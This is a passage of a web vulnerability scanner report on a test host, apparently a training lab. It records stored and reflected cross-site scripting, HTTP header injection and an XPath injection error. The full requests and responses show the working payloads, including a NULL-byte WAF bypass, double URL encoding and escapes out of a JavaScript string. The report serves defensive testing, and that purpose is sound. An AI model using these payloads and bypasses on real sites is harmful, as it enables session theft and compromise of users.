+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:41:40 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1874<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Credit card stor<br><b>...[SNIP]...</b><br>&lt;div id="Results"&gt;Error: '/users/user[name='Pete'' and password='nandos']<wbr>/creditcard' <span class="HIGHLIGHT">has an invalid token</span>.&lt;/div&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="7">7.&nbsp;Cross-site scripting (stored)</span>
+<br><a class="PREVNEXT" href="#6">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#8">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/search/11/Recent.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>SearchTerm</b> request parameter submitted to the URL /search/11/Default.aspx is copied into the HTML document as plain text between tags at the URL /search/11/Recent.aspx. The payload <b>7276d&lt;script&gt;alert(1)&lt;<wbr>/script&gt;37d42359d2b</b> was submitted in the SearchTerm parameter. This input was returned unmodified in a subsequent request for the URL /search/11/Recent.aspx.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.</span>
+<h2>Issue background</h2>
+<span class="TEXT">Stored cross-site scripting vulnerabilities arise when data which originated from any tainted source is copied into the application's responses in an unsafe way. An attacker can use the vulnerability to inject malicious JavaScript code into the application, which will execute within the browser of any user who views the relevant application content.<br><br>The attacker-supplied code can perform a wide variety of actions, such as stealing victims' session tokens or login credentials, performing arbitrary actions on their behalf, and logging their keystrokes.<br><br>Methods for introducing malicious content include any function where request parameters or headers are processed and stored by the application, and any out-of-band channel whereby data can be introduced into the application's processing space (for example, email messages sent over SMTP which are ultimately rendered within a web mail application).<br><br>Stored cross-site scripting flaws are typically more serious than reflected vulnerabilities because they do not require a separate delivery mechanism in order to reach target users, and they can potentially be exploited to create web application worms which spread exponentially amongst application users.<br><br>Note that automated detection of stored cross-site scripting vulnerabilities cannot reliably determine whether attacks that are persisted within the application can be accessed by any other user, only by authenticated users, or only by the attacker themselves. You should review the functionality in which the vulnerability appears to determine whether the application's behavior can feasibly be used to compromise other application users.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:<ul><li>Input should be validated as strictly as possible on arrival, given the kind of content which it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.</li><li>User input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>In cases where the application's functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.</span>
+<h2>Request 1</h2>
+<div class="rr_div"><span>POST /search/11/Default.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/search<wbr>/11/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 114<br><br>__VIEWSTATE=%2FwEPDw<wbr>UKMTQ0Mzg2MTQ4MGRkDb<wbr>6qOlzQXtovuhC5yknBe8G7iYU<wbr>%3D&amp;SearchTerm=<span class="HIGHLIGHT">7276d&lt;script&gt;alert(1)&lt;<wbr>/script&gt;37d42359d2b</span>&amp;SearchButton=Search<wbr>&amp;searchtype=1</span></div>
+<h2>Request 2</h2>
+<div class="rr_div"><span>GET /search/11/Recent.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/search<wbr>/11/Default.aspx<br>Connection: keep-alive<br><br></span></div>
+<h2>Response 2</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:05 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 31058<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Recent searches&lt;<br><b>...[SNIP]...</b><br>&lt;td&gt;<span class="HIGHLIGHT">7276d&lt;script&gt;alert(1)&lt;<wbr>/script&gt;37d42359d2b</span>&lt;/td&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="8">8.&nbsp;HTTP header injection</span>
+<br><a class="PREVNEXT" href="#7">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#9">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/settings/12/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>Language</b> request parameter is copied into the Set-Cookie response header. The payload <b>768fa%0d%0add05c75ca1e</b> was submitted in the Language parameter. This caused a response containing an injected HTTP header.</span>
+<h2>Issue background</h2>
+<span class="TEXT">HTTP header injection vulnerabilities arise when user-supplied data is copied into a response header in an unsafe way. If an attacker can inject newline characters into the header, then they can inject new HTTP headers and also, by injecting an empty line, break out of the headers into the message body and write arbitrary content into the application's response.<br><br>Various kinds of attack can be delivered via HTTP header injection vulnerabilities. Any attack that can be delivered via cross-site scripting can usually be delivered via header injection, because the attacker can construct a request which causes arbitrary JavaScript to appear within the response body. Further, it is sometimes possible to leverage header injection vulnerabilities to poison the cache of any proxy server via which users access the application. Here, an attacker sends a crafted request which results in a "split" response containing arbitrary content. If the proxy server can be manipulated to associate the injected response with another URL used within the application, then the attacker can perform a "stored" attack against this URL which will compromise other users who request that URL in future.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">If possible, applications should avoid copying user-controllable data into HTTP response headers. If this is unavoidable, then the data should be strictly validated to prevent header injection attacks. In most situations, it will be appropriate to allow only short alphanumeric strings to be copied into headers, and any other input should be rejected. At a minimum, input containing any characters with ASCII codes less than 0x20 should be rejected.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>POST /settings/12/Default.aspx HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/settings<wbr>/12/<br>Connection: keep-alive<br>Content-Type: application/x-www-form<wbr>-urlencoded<br>Content-Length: 105<br><br>__VIEWSTATE=%2FwEPDw<wbr>UJLTE0NTkzOTE2ZGR66y<wbr>NY0NUOHhvi9Cw2LO%2FfYfg6<wbr>%2BQ%3D%3D&amp;Language=<span class="HIGHLIGHT">768fa%0d%0add05c75ca1e</span>&amp;Update=Update</span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:55 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Set-Cookie: PreferredLanguage=<span class="HIGHLIGHT">768fa<br>dd05c75ca1e</span><br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1316<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Preferences&lt;/tit<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH0" id="9">9.&nbsp;Cross-site scripting (reflected)</span>
+<br><a class="PREVNEXT" href="#8">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#10">Next</a>
+<br>
+<br><span class="TEXT">There are 5 instances of this issue:
+<ul>
+<li><a href="#9.1">/search/11/Default.aspx [SearchTerm parameter]</a></li>
+<li><a href="#9.2">/search/21/Default.aspx [SearchTerm parameter]</a></li>
+<li><a href="#9.3">/search/36/Default.aspx [SearchTerm parameter]</a></li>
+<li><a href="#9.4">/search/46/Default.aspx [SearchTerm parameter]</a></li>
+<li><a href="#9.5">/search/48/Default.aspx [SearchTerm parameter]</a></li>
+</ul></span>
+<h2>Issue background</h2>
+<span class="TEXT">Reflected cross-site scripting vulnerabilities arise when data is copied from a request and echoed into the application's immediate response in an unsafe way. An attacker can use the vulnerability to construct a request which, if issued by another application user, will cause JavaScript code supplied by the attacker to execute within the user's browser in the context of that user's session with the application.<br><br>The attacker-supplied code can perform a wide variety of actions, such as stealing the victim's session token or login credentials, performing arbitrary actions on the victim's behalf, and logging their keystrokes.<br><br>Users can be induced to issue the attacker's crafted request in various ways. For example, the attacker can send a victim a link containing a malicious URL in an email or instant message. They can submit the link to popular web sites that allow content authoring, for example in blog comments. And they can create an innocuous looking web site which causes anyone viewing it to make arbitrary cross-domain requests to the vulnerable application (using either the GET or the POST method).<br><br>The security impact of cross-site scripting vulnerabilities is dependent upon the nature of the vulnerable application, the kinds of data and functionality which it contains, and the other applications which belong to the same domain and organization. If the application is used only to display non-sensitive public content, with no authentication or access control functionality, then a cross-site scripting flaw may be considered low risk. However, if the same application resides on a domain which can access cookies for other more security-critical applications, then the vulnerability could be used to attack those other applications, and so may be considered high risk. Similarly, if the organization which owns the application is a likely target for phishing attacks, then the vulnerability could be leveraged to lend credibility to such attacks, by injecting Trojan functionality into the vulnerable application, and exploiting users' trust in the organization in order to capture credentials for other applications which it owns. In many kinds of application, such as those providing online banking functionality, cross-site scripting should always be considered high risk.</span>
+<h2>Issue remediation</h2>
+<span class="TEXT">In most situations where user-controllable data is copied into application responses, cross-site scripting attacks can be prevented using two layers of defenses:<ul><li>Input should be validated as strictly as possible on arrival, given the kind of content which it is expected to contain. For example, personal names should consist of alphabetical and a small range of typographical characters, and be relatively short; a year of birth should consist of exactly four numerals; email addresses should match a well-defined regular expression. Input which fails the validation should be rejected, not sanitized.</li><li>User input should be HTML-encoded at any point where it is copied into application responses. All HTML metacharacters, including &lt; &gt; " ' and =, should be replaced with the corresponding HTML entities (&amp;lt; &amp;gt; etc).</li></ul>In cases where the application's functionality allows users to author content using a restricted subset of HTML tags and attributes (for example, blog comments which allow limited formatting and linking), it is necessary to parse the supplied HTML to validate that it does not use any dangerous syntax; this is a non-trivial task.</span>
+<br><br><div class="rule"></div>
+<span class="BODH1" id="9.1">9.1.&nbsp;http://mdsec.net/search/11/Default.aspx [SearchTerm parameter]</span>
+<br><a class="PREVNEXT" href="#2.4">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#9.2">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/search/11/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>SearchTerm</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>5e5b5&lt;script&gt;alert(1)&lt;<wbr>/script&gt;5fd408f4c442ba780</b> was submitted in the SearchTerm parameter. This input was echoed unmodified in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>The original request used the POST method, however it was possible to convert the request to use the GET method, to enable easier demonstration and delivery of the attack.</span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /search/11/Default.aspx?_<wbr>_VIEWSTATE=%2FwEPDwU<wbr>KMTQ0Mzg2MTQ4MGRkDb6<wbr>qOlzQXtovuhC5yknBe8G7iYU<wbr>%3D&amp;SearchTerm=a<span class="HIGHLIGHT">5e5b5&lt;script&gt;alert(1)&lt;<wbr>/script&gt;5fd408f4c442ba780</span>&amp;SearchButton=Search<wbr>&amp;searchtype=1 HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/search<wbr>/11/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:03 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1557<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Search&lt;/title&gt;<br><br><b>...[SNIP]...</b><br>&lt;div id="Result"&gt;No results found for expression: a<span class="HIGHLIGHT">5e5b5&lt;script&gt;alert(1)&lt;<wbr>/script&gt;5fd408f4c442ba780</span>&lt;/div&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="9.2">9.2.&nbsp;http://mdsec.net/search/21/Default.aspx [SearchTerm parameter]</span>
+<br><a class="PREVNEXT" href="#9.1">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#9.3">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/search/21/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>SearchTerm</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>%00d7694&lt;script&gt;alert(1)&lt;<wbr>/script&gt;bd11b27e2bcb71a17</b> was submitted in the SearchTerm parameter. This input was echoed as <b>d7694&lt;script&gt;alert(1)&lt;<wbr>/script&gt;bd11b27e2bcb71a17</b> in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>The application attempts to block certain characters that are often used in XSS attacks but this can be circumvented by submitting a URL-encoded NULL byte (%00) anywhere before the characters that are being blocked. <br><br>The original request used the POST method, however it was possible to convert the request to use the GET method, to enable easier demonstration and delivery of the attack.</span>
+<h2>Remediation detail</h2>
+<span class="TEXT">NULL byte bypasses typically arise when the application is being defended by a web application firewall (WAF) that is written in native code, where strings are terminated by a NULL byte. You should fix the actual vulnerability within the application code, and if appropriate ask your WAF vendor to provide a fix for the NULL byte bypass. </span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /search/21/Default.aspx?_<wbr>_VIEWSTATE=%2FwEPDwU<wbr>KMTQ0Mzg2MTQ4MGRkhpy<wbr>qKltuMnjqoiDDBA6Yv4Ti5YI<wbr>%3D&amp;SearchTerm=a<span class="HIGHLIGHT">%00d7694&lt;script&gt;alert(1)&lt;<wbr>/script&gt;bd11b27e2bcb71a17</span>&amp;SearchButton=Search<wbr>&amp;searchtype=1 HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/search<wbr>/21/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:21 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1562<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Search&lt;/title&gt;<br><br><b>...[SNIP]...</b><br>&lt;div id="Result"&gt;No results found for expression: a.<span class="HIGHLIGHT">d7694&lt;script&gt;alert(1)&lt;<wbr>/script&gt;bd11b27e2bcb71a17</span>&lt;/div&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="9.3">9.3.&nbsp;http://mdsec.net/search/36/Default.aspx [SearchTerm parameter]</span>
+<br><a class="PREVNEXT" href="#9.2">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#9.4">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/search/36/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>SearchTerm</b> request parameter is copied into the HTML document as plain text between tags. The payload <b>7f004%253cscript<wbr>%253ealert%25281%2529<wbr>%253c%252fscript<wbr>%253eaf079774f0f8e67d6</b> was submitted in the SearchTerm parameter. This input was echoed as <b>7f004&lt;script&gt;alert(1)&lt;<wbr>/script&gt;af079774f0f8e67d6</b> in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>The application attempts to block certain characters that are often used in XSS attacks but this can be circumvented by double URL-encoding the required characters - for example, by submitting %253c instead of the &lt; character. <br><br>The original request used the POST method, however it was possible to convert the request to use the GET method, to enable easier demonstration and delivery of the attack.</span>
+<h2>Remediation detail</h2>
+<span class="TEXT">There is probably no need to perform a second URL-decode of the value of the SearchTerm request parameter as the web server will have already carried out one decode. In any case, the application should perform its input validation <i>after</i> any custom canonicalization has been carried out. </span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /search/36/Default.aspx?_<wbr>_VIEWSTATE=%2FwEPDwU<wbr>KMTQ0Mzg2MTQ4MGRkGrl<wbr>uEFlHIK3n8TX7Lts0DOijYFY<wbr>%3D&amp;SearchTerm=a<span class="HIGHLIGHT">7f004%253cscript<wbr>%253ealert%25281%2529<wbr>%253c%252fscript<wbr>%253eaf079774f0f8e67d6</span>&amp;SearchButton=Search<wbr>&amp;searchtype=1 HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/search<wbr>/36/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:12 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1583<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Search&lt;/title&gt;<br><br><b>...[SNIP]...</b><br>&lt;div id="Result"&gt;No results found for expression: a<span class="HIGHLIGHT">7f004&lt;script&gt;alert(1)&lt;<wbr>/script&gt;af079774f0f8e67d6</span>&lt;/div&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="9.4">9.4.&nbsp;http://mdsec.net/search/46/Default.aspx [SearchTerm parameter]</span>
+<br><a class="PREVNEXT" href="#9.3">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#9.5">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/search/46/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>SearchTerm</b> request parameter is copied into a JavaScript string which is encapsulated in single quotation marks. The payload <b>66609'%3balert(1)/<wbr>/62362fd4b</b> was submitted in the SearchTerm parameter. This input was echoed as <b>66609';alert(1)/<wbr>/62362fd4b</b> in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>The original request used the POST method, however it was possible to convert the request to use the GET method, to enable easier demonstration and delivery of the attack.</span>
+<h2>Remediation detail</h2>
+<span class="TEXT">Echoing user-controllable data within a script context is inherently dangerous and can make XSS attacks difficult to prevent. If at all possible, the application should avoid echoing user data within this context. </span>
+<h2>Request</h2>
+<div class="rr_div"><span>GET /search/46/Default.aspx?_<wbr>_VIEWSTATE=%2FwEPDwU<wbr>KMTQ0Mzg2MTQ4MGRkbUx<wbr>%2F6cKLAD1bqR3r1dNPP<wbr>R8RF6Y%3D&amp;SearchTerm=a<span class="HIGHLIGHT">66609'%3balert(1)/<wbr>/62362fd4b</span>&amp;SearchButton=Search<wbr>&amp;searchtype=1 HTTP/1.1<br>Host: mdsec.net<br>User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0<br>Accept: text/html,application<wbr>/xhtml+xml,application<wbr>/xml;q=0.9,*/*;q=0.8<br>Accept-Language: en-US,en;q=0.5<br>Accept-Encoding: gzip, deflate<br>Referer: http://mdsec.net/search<wbr>/46/<br>Connection: keep-alive<br><br></span></div>
+<h2>Response</h2>
+<div class="rr_div"><span>HTTP/1.1 200 OK<br>Date: Wed, 10 Apr 2013 12:43:33 GMT<br>Server: Microsoft-IIS/6.0<br>MicrosoftOfficeWebServer: 5.0_Pub<br>X-Powered-By: ASP.NET<br>X-AspNet-Version: 2.0.50727<br>Cache-Control: private<br>Content-Type: text/html; charset=utf-8<br>Content-Length: 1522<br><br>&lt;!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR<wbr>/xhtml1/DTD/xhtml1<wbr>-transitional.dtd"&gt;<br>&lt;html xmlns="http://www.w3.org<wbr>/1999/xhtml" &gt;<br>&lt;head&gt;<br>&lt;title&gt;Search&lt;/title&gt;<br><br><b>...[SNIP]...</b><br>&lt;script&gt;var a = 'No results found for expression: a<span class="HIGHLIGHT">66609';alert(1)/<wbr>/62362fd4b</span>'; alert(a);&lt;/script&gt;<br><b>...[SNIP]...</b><br></span></div>
+<div class="rule"></div>
+<span class="BODH1" id="9.5">9.5.&nbsp;http://mdsec.net/search/48/Default.aspx [SearchTerm parameter]</span>
+<br><a class="PREVNEXT" href="#9.4">Previous</a>
+&nbsp;<a class="PREVNEXT" href="#13.1">Next</a>
+<br>
+<h2>Summary</h2>
+<table cellpadding="0" cellspacing="0" class="summary_table">
+<tr>
+<td rowspan="4" class="icon" valign="top" align="center"><img width="32" height="32" src="images/scan_issue_high_certain_rpt.png"></td>
+<td>Severity:&nbsp;&nbsp;</td>
+<td><b>High</b></td>
+</tr>
+<tr>
+<td>Confidence:&nbsp;&nbsp;</td>
+<td><b>Certain</b></td>
+</tr>
+<tr>
+<td>Host:&nbsp;&nbsp;</td>
+<td><b>http://mdsec.net</b></td>
+</tr>
+<tr>
+<td>Path:&nbsp;&nbsp;</td>
+<td><b>/search/48/Default.aspx</b></td>
+</tr>
+</table>
+<h2>Issue detail</h2>
+<span class="TEXT">The value of the <b>SearchTerm</b> request parameter is copied into a JavaScript string which is encapsulated in single quotation marks. The payload <b>65510\'%3balert(1)/<wbr>/080bc0d37</b> was submitted in the SearchTerm parameter. This input was echoed as <b>65510\\';alert(1)/<wbr>/080bc0d37</b> in the application's response.<br><br>This proof-of-concept attack demonstrates that it is possible to inject arbitrary JavaScript into the application's response.<br><br>The application attempts to prevent termination of the quoted JavaScript string by placing a backslash character (\) before any quotation mark characters contained within the input. The purpose of this defense is to escape the quotation mark and prevent it from terminating the string. However, the application fails to escape any backslash characters that already appear within the input itself. This enables an attacker to supply their own backslash character before the quotation mark, which has the effect of escaping the backslash character added by the application, and so the quotation mark remains unescaped and succeeds in terminating the string. This technique is used in the attack demonstrated.<br><br>The original request used the POST method, however it was possible to convert the request to use the GET method, to enable easier demonstration and delivery of the attack.</span>
+<h2>Remediation detail</h2>
+<span class="TEXT">Echoing user-controllable data within a script context is inherently dangerous and can make XSS attacks difficult to prevent. If at all possible, the application should avoid echoing user data within this context. If it is unavoidable to echo user input into a quoted JavaScript string then the backslash character should be blocked, or escaped by replacing it with two backslashes. </span>
+<h2>Request</h2>
